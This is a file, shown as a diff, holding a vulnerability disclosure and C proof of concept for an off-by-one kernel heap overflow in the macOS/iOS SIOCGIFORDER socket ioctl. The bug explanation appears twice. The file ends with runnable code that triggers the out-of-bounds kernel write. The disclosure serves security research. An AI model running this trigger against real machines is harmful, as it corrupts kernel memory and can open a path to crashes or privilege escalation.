@@ -1,0 +1,185 @@
+/*
+
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1111
+
+SIOCSIFORDER and SIOCGIFORDER allow userspace programs to build and maintain the
+ifnet_ordered_head linked list of interfaces.
+
+SIOCSIFORDER clears the existing list and allows userspace to specify an array of
+interface indexes used to build a new list.
+
+SIOCGIFORDER allow userspace to query the list of interface identifiers used to build
+that list.
+
+Here's the relevant code for SIOCGIFORDER:
+
+    case SIOCGIFORDER: {    /* struct if_order */
+      struct if_order *ifo = (struct if_order *)(void *)data;
+      
+      u_int32_t ordered_count = if_ordered_count;   <----------------- (a)
+      
+      if (ifo->ifo_count == 0 ||
+          ordered_count == 0) {
+        ifo->ifo_count = ordered_count;
+      } else if (ifo->ifo_ordered_indices != USER_ADDR_NULL) {
+        u_int32_t count_to_copy =
+        MIN(ordered_count, ifo->ifo_count);          <---------------- (b)
+        size_t length = (count_to_copy * sizeof(u_int32_t));
+        struct ifnet *ifp = NULL;
+        u_int32_t cursor = 0;
+        
+        ordered_indices = _MALLOC(length, M_NECP, M_WAITOK);
+        if (ordered_indices == NULL) {
+          error = ENOMEM;
+          break;
+        }
+        
+        ifnet_head_lock_shared();
+        TAILQ_FOREACH(ifp, &ifnet_ordered_head, if_ordered_link) {
+          if (cursor > count_to_copy) {            <------------------ (c)
+            break;
+          }
+          ordered_indices[cursor] = ifp->if_index; <------------------ (d)
+          cursor++;
+        }
+        ifnet_head_done();
+
+
+at (a) it reads the actual length of the list (of course it should take the lock here too,
+but that's not the bug I'm reporting)
+
+at (b) it computes the number of entries it wants to copy as the minimum of the requested number
+and the actual number of entries in the list
+
+the loop at (c) iterates through the list of all entries and the check at (c) is supposed to check that
+the write at (d) won't go out of bounds, but it should be a >=, not a >, as cursor is the number of
+elements *already* written. If count_to_copy is 0, and cursor is 0 the write will still happen!
+
+By requesting one fewer entries than are actually in the list the code will always write one interface index
+entry one off the end of the ordered_indices array.
+
+This poc makes a list with 5 entries then requests 4. This allocates a 16-byte kernel buffer to hold the 4 entries
+then writes 5 entries into there.
+
+tested on MacOS 10.12.3 (16D32) on MacbookAir5,2
+*/
+
+// ianbeer
+// add gzalloc_size=16 to boot args to see the actual OOB write more easily
+#if 0
+MacOS/iOS kernel memory corruption due to off-by-one in SIOCGIFORDER socket ioctl
+
+SIOCSIFORDER and SIOCGIFORDER allow userspace programs to build and maintain the
+ifnet_ordered_head linked list of interfaces.
+
+SIOCSIFORDER clears the existing list and allows userspace to specify an array of
+interface indexes used to build a new list.
+
+SIOCGIFORDER allow userspace to query the list of interface identifiers used to build
+that list.
+
+Here's the relevant code for SIOCGIFORDER:
+
+    case SIOCGIFORDER: {		/* struct if_order */
+      struct if_order *ifo = (struct if_order *)(void *)data;
+      
+      u_int32_t ordered_count = if_ordered_count;   <----------------- (a)
+      
+      if (ifo->ifo_count == 0 ||
+          ordered_count == 0) {
+        ifo->ifo_count = ordered_count;
+      } else if (ifo->ifo_ordered_indices != USER_ADDR_NULL) {
+        u_int32_t count_to_copy =
+        MIN(ordered_count, ifo->ifo_count);          <---------------- (b)
+        size_t length =	(count_to_copy * sizeof(u_int32_t));
+        struct ifnet *ifp = NULL;
+        u_int32_t cursor = 0;
+        
+        ordered_indices = _MALLOC(length, M_NECP, M_WAITOK);
+        if (ordered_indices == NULL) {
+          error = ENOMEM;
+          break;
+        }
+        
+        ifnet_head_lock_shared();
+        TAILQ_FOREACH(ifp, &ifnet_ordered_head, if_ordered_link) {
+          if (cursor > count_to_copy) {            <------------------ (c)
+            break;
+          }
+          ordered_indices[cursor] = ifp->if_index; <------------------ (d)
+          cursor++;
+        }
+        ifnet_head_done();
+
+
+at (a) it reads the actual length of the list (of course it should take the lock here too,
+but that's not the bug I'm reporting)
+
+at (b) it computes the number of entries it wants to copy as the minimum of the requested number
+and the actual number of entries in the list
+
+the loop at (c) iterates through the list of all entries and the check at (c) is supposed to check that
+the write at (d) won't go out of bounds, but it should be a >=, not a >, as cursor is the number of
+elements *already* written. If count_to_copy is 0, and cursor is 0 the write will still happen!
+
+By requesting one fewer entries than are actually in the list the code will always write one interface index
+entry one off the end of the ordered_indices array.
+
+This poc makes a list with 5 entries then requests 4. This allocates a 16-byte kernel buffer to hold the 4 entries
+then writes 5 entries into there.
+
+tested on MacOS 10.12.3 (16D32) on MacbookAir5,2
+#endif
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <unistd.h>
+
+#include <sys/ioctl.h>
+#include <sys/socket.h>
+
+#include <mach/mach.h>
+
+struct if_order {
+	u_int32_t			ifo_count;
+	u_int32_t			ifo_reserved;
+	mach_vm_address_t	ifo_ordered_indices; /* array of u_int32_t */
+};
+
+#define SIOCSIFORDER  _IOWR('i', 178, struct if_order)
+#define SIOCGIFORDER  _IOWR('i', 179, struct if_order)
+
+void set(int fd, uint32_t n) {
+  uint32_t* data = malloc(n*4);
+  for (int i = 0; i < n; i++) {
+    data[i] = 1;
+  }
+
+	struct if_order ifo;
+  ifo.ifo_count = n;
+  ifo.ifo_reserved = 0;
+  ifo.ifo_ordered_indices = (mach_vm_address_t)data;
+
+  ioctl(fd, SIOCSIFORDER, &ifo);
+  free(data);
+}
+
+void get(int fd, uint32_t n) {
+  uint32_t* data = malloc(n*4);
+  memset(data, 0, n*4);
+
+	struct if_order ifo;
+  ifo.ifo_count = n;
+  ifo.ifo_reserved = 0;
+  ifo.ifo_ordered_indices = (mach_vm_address_t)data;
+
+  ioctl(fd, SIOCGIFORDER, &ifo);
+  free(data);
+}
+
+int main() {
+  int fd = socket(PF_INET, SOCK_STREAM, 0);
+  set(fd, 5);
+  get(fd, 4);
+  return 0;
+}
